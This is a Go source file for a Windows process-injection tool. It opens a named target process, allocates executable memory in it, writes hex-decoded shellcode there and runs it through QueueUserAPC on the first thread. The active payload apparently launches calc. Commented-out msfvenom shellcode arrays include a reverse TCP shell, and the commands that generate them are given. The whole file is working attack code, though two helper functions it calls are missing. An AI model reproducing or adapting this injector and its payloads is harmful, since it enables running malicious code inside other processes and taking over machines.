package main

import "os"
import "fmt"
import "syscall"
import "unsafe"
import "time"
import "encoding/hex"

func OpenProcess(processAccess int, bInheritHandle int, processId uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess").Call(
      uintptr(processAccess),
      uintptr(bInheritHandle),
      uintptr(processId),
   )
   return uintptr(ret)
}


func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func WriteProcessMemory(hProcess uintptr, lpAddress uintptr, lpBuffer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lpBuffer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


// kernel32 - static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);
func Thread32First(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("Thread32First").Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func Thread32Next(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("Thread32Next").Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


// OpenThread
// [DllImport("kernel32.dll", SetLastError = true)]
// static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
func OpenThread(dwDesiredAccess uint, bInheritHandle int, dwThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("OpenThread").Call(
      uintptr(dwDesiredAccess),
      uintptr(bInheritHandle),
      uintptr(dwThreadId),
   )
   return uintptr(ret)
}


// QueueUserAPC
// [DllImport("kernel32.dll")]
// public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
func QueueUserAPC(pfnAPC uintptr, hThread uintptr, dwData uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("QueueUserAPC").Call(
      uintptr(pfnAPC),
      uintptr(hThread),
      uintptr(dwData),
   )
   return uintptr(ret)
}


func CloseHandle(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func GetThreads(pid uintptr) []uint32 {
   var thread_ids_slice []uint32;
   snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPTHREAD, 0)
   if err != nil {
         fmt.Println("[-] Error calling CreateToolhelp32Snapshot:", err);
   }

   // const _THREAD_SUSPEND_RESUME = 0x0002;
   type ThreadEntry32 struct {
      Size           uint32
      tUsage         uint32
      ThreadID       uint32
      OwnerProcessID uint32
      BasePri        int32
      DeltaPri       int32
      Flags          uint32
   }

   var te ThreadEntry32;
   te.Size = uint32(unsafe.Sizeof(te));
   Thread32First(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
 
   for{

      if (Thread32Next(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
      if (te.OwnerProcessID == uint32(pid)){
         // fmt.Println("[+] te.OwnerProcessID:\t", te.OwnerProcessID);
         // fmt.Println("[+] te.ThreadID:\t", te.ThreadID);
         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
      }
   }

   CloseHandle(uintptr(snapshot));

   return thread_ids_slice;
}


func QueueUserAPC_Injection(process_name string) int {
   var proc_handles_slice []uintptr = GetProcessByName(process_name);
   var first_proc = proc_handles_slice[0];
   var pid uintptr = GetProcessId(first_proc);
   fmt.Println("[+] Process PID: \t\t", pid);

   // Payload
   // Payload: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp -b "\x00\x0a\x0d" exitfunc=thread
   // buf := []byte{0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0x73,0x1f,0x6e,0xa3,0xdb,0x17,0xd6,0x07,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x8f,0x57,0xed,0x47,0x2b,0xff,0x16,0x07,0x73,0x1f,0x2f,0xf2,0x9a,0x47,0x84,0x56,0x25,0x57,0x5f,0x71,0xbe,0x5f,0x5d,0x55,0x13,0x57,0xe5,0xf1,0xc3,0x5f,0x5d,0x55,0x53,0x57,0xe5,0xd1,0x8b,0x5f,0xd9,0xb0,0x39,0x55,0x23,0x92,0x12,0x5f,0xe7,0xc7,0xdf,0x23,0x0f,0xdf,0xd9,0x3b,0xf6,0x46,0xb2,0xd6,0x63,0xe2,0xda,0xd6,0x34,0xea,0x21,0x5e,0x3f,0xeb,0x50,0x45,0xf6,0x8c,0x31,0x23,0x26,0xa2,0x0b,0x9c,0x56,0x8f,0x73,0x1f,0x6e,0xeb,0x5e,0xd7,0xa2,0x60,0x3b,0x1e,0xbe,0xf3,0x50,0x5f,0xce,0x43,0xf8,0x5f,0x4e,0xea,0xda,0xc7,0x35,0x51,0x3b,0xe0,0xa7,0xe2,0x50,0x23,0x5e,0x4f,0x72,0xc9,0x23,0x92,0x12,0x5f,0xe7,0xc7,0xdf,0x5e,0xaf,0x6a,0xd6,0x56,0xd7,0xc6,0x4b,0xff,0x1b,0x52,0x97,0x14,0x9a,0x23,0x7b,0x5a,0x57,0x72,0xae,0xcf,0x8e,0x43,0xf8,0x5f,0x4a,0xea,0xda,0xc7,0xb0,0x46,0xf8,0x13,0x26,0xe7,0x50,0x57,0xca,0x4e,0x72,0xcf,0x2f,0x28,0xdf,0x9f,0x9e,0x06,0xa3,0x5e,0x36,0xe2,0x83,0x49,0x8f,0x5d,0x32,0x47,0x2f,0xfa,0x9a,0x4d,0x9e,0x84,0x9f,0x3f,0x2f,0xf1,0x24,0xf7,0x8e,0x46,0x2a,0x45,0x26,0x28,0xc9,0xfe,0x81,0xf8,0x8c,0xe0,0x33,0xeb,0x61,0x16,0xd6,0x07,0x73,0x1f,0x6e,0xa3,0xdb,0x5f,0x5b,0x8a,0x72,0x1e,0x6e,0xa3,0x9a,0xad,0xe7,0x8c,0x1c,0x98,0x91,0x76,0x60,0xf7,0xcb,0x2d,0x79,0x5e,0xd4,0x05,0x4e,0xaa,0x4b,0xf8,0xa6,0x57,0xed,0x67,0xf3,0x2b,0xd0,0x7b,0x79,0x9f,0x95,0x43,0xae,0x12,0x6d,0x40,0x60,0x6d,0x01,0xc9,0xdb,0x4e,0x97,0x8e,0xa9,0xe0,0xbb,0xc0,0xba,0x7b,0xb5,0x29,0x16,0x67,0x0b,0xa3,0xdb,0x17,0xd6,0x07}
   // Payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread
   // buf := []byte{0x48,0x31,0xc9,0x48,0x81,0xe9,0xc6,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0x64,0x28,0x0e,0xc1,0x39,0x5c,0x9f,0xfb,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x98,0x60,0x8d,0x25,0xc9,0xb4,0x5f,0xfb,0x64,0x28,0x4f,0x90,0x78,0x0c,0xcd,0xaa,0x32,0x60,0x3f,0x13,0x5c,0x14,0x14,0xa9,0x04,0x60,0x85,0x93,0x21,0x14,0x14,0xa9,0x44,0x60,0x85,0xb3,0x69,0x14,0x90,0x4c,0x2e,0x62,0x43,0xf0,0xf0,0x14,0xae,0x3b,0xc8,0x14,0x6f,0xbd,0x3b,0x70,0xbf,0xba,0xa5,0xe1,0x03,0x80,0x38,0x9d,0x7d,0x16,0x36,0x69,0x5f,0x89,0xb2,0x0e,0xbf,0x70,0x26,0x14,0x46,0xc0,0xe9,0xd7,0x1f,0x73,0x64,0x28,0x0e,0x89,0xbc,0x9c,0xeb,0x9c,0x2c,0x29,0xde,0x91,0xb2,0x14,0x87,0xbf,0xef,0x68,0x2e,0x88,0x38,0x8c,0x7c,0xad,0x2c,0xd7,0xc7,0x80,0xb2,0x68,0x17,0xb3,0x65,0xfe,0x43,0xf0,0xf0,0x14,0xae,0x3b,0xc8,0x69,0xcf,0x08,0x34,0x1d,0x9e,0x3a,0x5c,0xc8,0x7b,0x30,0x75,0x5f,0xd3,0xdf,0x6c,0x6d,0x37,0x10,0x4c,0x84,0xc7,0xbf,0xef,0x68,0x2a,0x88,0x38,0x8c,0xf9,0xba,0xef,0x24,0x46,0x85,0xb2,0x1c,0x83,0xb2,0x65,0xf8,0x4f,0x4a,0x3d,0xd4,0xd7,0xfa,0xb4,0x69,0x56,0x80,0x61,0x02,0xc6,0xa1,0x25,0x70,0x4f,0x98,0x78,0x06,0xd7,0x78,0x88,0x08,0x4f,0x93,0xc6,0xbc,0xc7,0xba,0x3d,0x72,0x46,0x4a,0x2b,0xb5,0xc8,0x04,0x9b,0xd7,0x53,0x88,0x87,0x2b,0xec,0xc9,0x3b,0x1b,0x3c,0xc1,0x39,0x1d,0xc9,0xb2,0xed,0xce,0x46,0x40,0xd5,0xfc,0x9e,0xfb,0x64,0x61,0x87,0x24,0x70,0xe0,0x9d,0xfb,0x75,0x74,0x71,0xc1,0x39,0x5d,0xde,0xaf,0x2d,0xa1,0xea,0x8d,0xb0,0xad,0xde,0x41,0x28,0x5f,0x28,0xc6,0xc6,0x89,0xd3,0x72,0x8e,0x40,0x0f,0xc0,0x39,0x5c,0xc6,0xba,0xde,0x01,0x8e,0xaa,0x39,0xa3,0x4a,0xab,0x34,0x65,0x3f,0x08,0x74,0x6d,0x5f,0xb3,0x9b,0xe8,0x46,0x48,0xfb,0x14,0x60,0x3b,0x2c,0xa1,0xcf,0x80,0x83,0xb6,0x90,0x24,0x84,0xd7,0xdb,0x89,0xb0,0x9b,0xf5,0xeb,0x25,0x70,0x42,0x48,0xdb,0x14,0x16,0x02,0x25,0x92,0x97,0x64,0x4d,0x3d,0x60,0x2e,0x2c,0xa9,0xca,0x81,0x3b,0x5c,0x9f,0xb2,0xdc,0x4b,0x63,0xa5,0x39,0x5c,0x9f,0xfb,0x64,0x69,0x5e,0x80,0x69,0x14,0x16,0x19,0x33,0x7f,0x59,0x8c,0x08,0x9c,0xf5,0xf6,0x3d,0x69,0x5e,0x23,0xc5,0x3a,0x58,0xbf,0x40,0x7c,0x0f,0xc0,0x71,0xd1,0xdb,0xdf,0x7c,0xee,0x0e,0xa9,0x71,0xd5,0x79,0xad,0x34,0x69,0x5e,0x80,0x69,0x1d,0xcf,0xb2,0x9b,0xe8,0x4f,0x91,0x70,0xa3,0x57,0xb6,0xed,0xe9,0x42,0x48,0xf8,0x1d,0x25,0x82,0xa8,0x17,0x88,0x3e,0xec,0x14,0xae,0x29,0x2c,0xd7,0xc4,0x4a,0x37,0x1d,0x25,0xf3,0xe3,0x35,0x6e,0x3e,0xec,0xe7,0x7f,0xe6,0x4e,0x22,0x4f,0x7b,0x9f,0xc9,0x22,0x66,0x9b,0xfd,0x46,0x42,0xfd,0x74,0xa3,0xfd,0x18,0x22,0x8e,0x3a,0xd9,0x29,0x9a,0x40,0x23,0x3b,0x7c,0xae,0x53,0x5c,0xc6,0xba,0xed,0xf2,0xf1,0x14,0x39,0x5c,0x9f,0xfb}
   buf, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

   // OpenProcess
   // IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid);
   if (proc_handle == 0){
      fmt.Println("[-] OpenProcess API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   // IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
   var assigned_address uintptr = VirtualAllocEx(proc_handle, 0, uint(len(buf)), 0x1000, 0x20);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   // auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
   // Payload: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp -b "\x00\x0a\x0d" exitfunc=thread
   var res uintptr = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);

   // OpenThread
   // ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
   // IntPtr hThreadId = auxOpenThread(0x0010, false, (uint)hThread.Id);
   var thread_ids_slice []uint32 = GetThreads(pid);
   var first_thread uint32 = thread_ids_slice[0];
   fmt.Println("[+] First thread:\t\t", first_thread);
   var thread_handle uintptr = OpenThread(0x0010, 0, first_thread);
   fmt.Println("[+] Thread handle:\t\t", thread_handle, "(", fmt.Sprintf("0x%x", thread_handle), ")");

   // QueueUserAPC
   // auxQueueUserAPC(addr, hThreadId, 0);
   var queueUserAPC_res uintptr = QueueUserAPC(assigned_address, thread_handle, 0);
   fmt.Println("[+] queueUserAPC_res:\t\t", queueUserAPC_res);

   // CloseHandle
   CloseHandle(thread_handle);
   CloseHandle(proc_handle);

   time.Sleep(0 * time.Second)
   
   return 0;
}


func main() {
   process_name := os.Args[1]
   fmt.Println("[+] Process name: \t\t", process_name);
   QueueUserAPC_Injection(process_name);
}